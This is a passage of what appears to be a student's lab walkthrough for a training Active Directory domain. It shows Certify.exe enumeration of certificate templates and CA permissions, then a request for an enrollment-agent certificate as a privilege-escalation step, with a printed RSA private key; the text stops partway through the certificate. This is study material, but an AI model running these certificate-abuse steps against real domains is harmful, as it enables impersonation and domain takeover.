+    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local
+    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
+    CA Permissions                :
+      Owner: BUILTIN\Administrators        S-1-5-32-544
+
+      Access Rights                                     Principal
+
+      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+    Enrollment Agent Restrictions : None
+
+[*] Available Certificates Templates :
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : User
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : EFS
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Encrypting File System
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Users            S-1-5-21-335606122-960912869-3279953914-513
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : Administrator
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : EFSRecovery
+    Schema Version                        : 1
+    Validity Period                       : 5 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : File Recovery
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : Machine
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Computers        S-1-5-21-335606122-960912869-3279953914-515
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : DomainController
+    Schema Version                        : 1
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : WebServer
+    Schema Version                        : 1
+    Validity Period                       : 2 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Server Authentication
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SubCA
+    Schema Version                        : 1
+    Validity Period                       : 5 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : NONE
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : <null>
+    mspki-certificate-application-policy  : <null>
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : DomainControllerAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
+    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : DirectoryEmailReplication
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Directory Service Email Replication
+    mspki-certificate-application-policy  : Directory Service Email Replication
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : KerberosAuthentication
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
+    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Domain Controllers      S-1-5-21-335606122-960912869-3279953914-516
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+                                      mcorp\Enterprise Read-only Domain ControllersS-1-5-21-335606122-960912869-3279953914-498
+                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
+      Object Control Permissions
+        Owner                       : mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteOwner Principals       : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SmartCardEnrollment-Agent
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Certificate Request Agent
+    mspki-certificate-application-policy  : Certificate Request Agent
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : SmartCardEnrollment-Users
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : AUTO_ENROLLMENT
+    Authorized Signatures Required        : 1
+    Application Policies                  : Certificate Request Agent
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\Domain Users            S-1-5-21-719815819-3726368948-3917688648-513
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : HTTPSCertificates
+    Schema Version                        : 2
+    Validity Period                       : 10 years
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+
+    CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+    Template Name                         : CA-Integration
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
+    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
+    Authorized Signatures Required        : 0
+    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+      Object Control Permissions
+        Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+        WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+        WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500
+                                      mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512
+                                      mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519
+```
+
+Now, request an Enrollment Agent Certificate from the template "SmartCardEnrollment-Agent"
+
+* C:\AD\Tools> C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
+
+```
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v1.1.0
+
+[*] Action: Request a Certificates
+
+[*] Current user context    : dcorp\student731
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : SmartCardEnrollment-Agent
+[*] Subject                 : CN=student731, CN=Users, DC=dollarcorp, DC=moneycorp, DC=local
+
+[*] Certificate Authority   : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA
+
+[*] CA Response             : The certificate had been issued.
+[*] Request ID              : 37
+
+[*] cert.pem         :
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAqWezM7mzY46y45ZJ5jrwu2fApbLwNKC4VlUSf5Uk8em09/XO
+mXgqmdTlqmU8gImIoGhRc0Mwynsz9raBtqvg91BaJlTEvWC4xbAi2DZFBkCUj00J
+3aHcVkyFWYzJFoCYOteEeN607feK1CEOSGcHl81dmkJmx4fWeDo5/53oHTqFkKpy
+v9dTY8E4S20W4CyXE8G+5Jom94Oq8jRNU9zjwbLxG2yvQudmq0cVzEAwvI45UAVS
+PlsqL4TEdtoNuf3x3Y1ofrw/1Nr24idQ5UZj4a4YHoExzcK45cMVjGFNvnp/rYHP
+njyannXm2cpowSxr/UXeuc+JM6BaJBzTQnpX1QIDAQABAoIBAEmz3Up2065P6lKM
+E3DAWfYfCLjOpiUve6PL9XVejSlW1a4/2nf4yQgOkTFWREFkFPY9DJrKM9MUUSJY
+ewzfsMvIwMAGh2YhS6JupGpPCi7TMA88pDsx7av6NNYmI2LP5etL0s3Hjw4tcdAi
+5ZTohmwsJDo2A4Nx/QRnyM4GhHMaSpT91tamzG1yFTZeqZ76MMlWOiKlxNrsrAao
+HI5nz6/3RGtzWmiQJW8hBpx/W9vjfAImcGBdbFj6QozEKKN+cdudDAK4bf6KKiQf
+GEG/zrXAo2rlC85A5/op/cgLvuaw7+YSd7Xf9l23z8u/onY6EXqa3aog7ZSostNz
+JBD7160CgYEAxs73Y5PK3pWitNaBdR9I9Hlxg9fVOQEkgbhr6DGXy2uzvbWhWTcV
+qo2Dq3SxPelLhJP1dKubSvsF23+xkiArlrPX/ManzNP6hwJiBY07Ka8GYzYKAFEF
+96PTNAGv7KF9MF1tT2vuWVo6f7zMtPOafpFxxbTUbntYv/dIXSCBIF8CgYEA2iNa
+ccJQUq9omyM37hc6ECAE3vylHVymAn14K+ax90Cuwprip3i/retD0ThpqIAJfOIu
+GZPPjPpGS/Xr9wwmwi4b4pzTnC2vr/fSU9a+87jAtbqy4Aq2+ITMlmtjvCZfkpsE
+6EVFWvBDyv4THSW5Sow12glLTTxd6LwEYiC3pEsCgYBtvbExdlN1qoO17vJnBG3x
+BVhzvqAkZ00Pjg2Cjl2MHFeLUMdPx+hdzN/xtOhhlHXrKQFE9bUzHn2NPF94mel1
+trBzB/V4S0rvW5FgHyWZTNPpz9qVciQpHnVnL8c8h6fjGq9MN/fJutSvzjfxasbN
+NtvmlnrswYmr7YQ0Y8zjYQKBgQDTfAcJ12vsXic6kTB+YoJmc8SFM8gY6WQBcgd5
++JV9s3Y7MdKgrw6W3UrIorq9JDUOoHI1VfqZIWPZ7TiyMVO6Wt2qHIWEGz8DiW6e
+3coPnIUpKzKUx46Q7p8zDjaJiWKLTkO5tL8C5YG0YhPB5Hr57WmgU/ZvkSEyrGZL
+hJDGdQKBgBpRbwVIqZ0sWe8bNEeklk8Pk5p4dPkt5MYtJgZado+dfOr02fBvzqnL
+Z0VDBgmyG+FMCTE21P6/oWfg32PSfn4giH+7+9qp6th3GmhGi1oFBy5mhZGq5AFT
+Fl2GxG6mWs8rH/rZgYOUtkVJ22Wj5Cdn75fKHHsTcWsM0afHFxZu
+-----END RSA PRIVATE KEY-----
+-----BEGIN CERTIFICATE-----
+MIIGWDCCBUCgAwIBAgITFQAAACUUE3y24XWb0gAAAAAAJTANBgkqhkiG9w0BAQsF
+ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGTAXBgoJkiaJk/IsZAEZFgltb25l
+eWNvcnAxHjAcBgNVBAMTFW1vbmV5Y29ycC1NQ09SUC1EQy1DQTAeFw0yNTA5MzAw
+MDU3MjFaFw0yNzA5MzAwMTA3MjFaMHMxFTATBgoJkiaJk/IsZAEZFgVsb2NhbDEZ
